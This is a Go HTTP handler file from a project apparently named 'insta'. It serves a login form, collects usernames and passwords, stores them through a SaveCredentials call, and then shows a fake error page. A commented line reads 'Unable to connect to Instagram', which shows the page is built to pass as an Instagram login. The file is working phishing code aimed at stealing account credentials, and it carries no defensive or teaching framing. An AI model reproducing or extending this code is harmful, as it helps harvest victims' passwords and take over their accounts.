package handler

import (
	"html/template"
	"insta/pkg/check"
	"insta/pkg/config"
	"insta/pkg/render"
	"insta/pkg/save"
	"log"
	"net/http"
	"regexp"
)

// Repository is the repository type
type Repository struct {
	App *config.AppConfig
}

func NewRepo(a *config.AppConfig) *Repository {
	return &Repository{
		App: a,
	}
}

// Repo the repository used by the handlers
var Repo *Repository

// NewHandlers sets the repository for the handlers
func NewHandlers(r *Repository) {
	Repo = r
}

func (m *Repository) Index(w http.ResponseWriter, r *http.Request) {

	//remoteIp := r.RemoteAddr
	//m.App.Session.Put(r.Context(), "remote_ip", remoteIp)
	render.RenderTemplate(w, "index.html")
}

func (m *Repository) LoginHandlerFilter(w http.ResponseWriter, r *http.Request) {

	if err := r.ParseForm(); err != nil {
		http.Error(w, "ParseForm error", http.StatusInternalServerError)
		return
	}
	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	// Validate username
	InvalidUsername := !check.Username(uName)

	if InvalidUsername == true {

		tpl, err := template.ParseFiles("./templates/index.html", "./templates/layout.html")
		if err != nil {
			log.Fatal(err)
		}
		data := struct {
			InvalidUsername bool
		}{
			InvalidUsername: true, // or false, depending on the condition
		}

		err = tpl.ExecuteTemplate(w, "index.html", data)
		if err != nil {
			log.Fatal(err)
		}
	}

	if len(pass) > 6 && !InvalidUsername {

		save.SaveCredentials(uName, pass)
		// dialog.Alert("Unable to connect to Instagram")
		render.RenderTemplate(w, "500.html")
	} else {

	}

}

func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {

	if err := r.ParseForm(); err != nil {
		http.Error(w, "ParseForm error", http.StatusInternalServerError)
		return
	}
	uName := r.FormValue("u_name")
	pass := r.FormValue("pass")

	pattern := "^[a-zA-Z0-9_]{3,20}$"
	match, err := regexp.MatchString(pattern, uName)
	if err != nil {
		log.Fatal(err)
	}

	if len(pass) > 6 && match {

		save.SaveCredentials(uName, pass)
		// dialog.Alert("Unable to connect to Instagram")
		render.RenderTemplate(w, "500.html")
	} else {

		tpl, err := template.ParseFiles("./templates/index.html", "./templates/layout.html")
		if err != nil {
			log.Fatal(err)
		}
		data := struct {
			InvalidUsername bool
		}{
			InvalidUsername: true, // or false, depending on the condition
		}

		err = tpl.ExecuteTemplate(w, "index.html", data)
		if err != nil {
			log.Fatal(err)
		}

	}

}
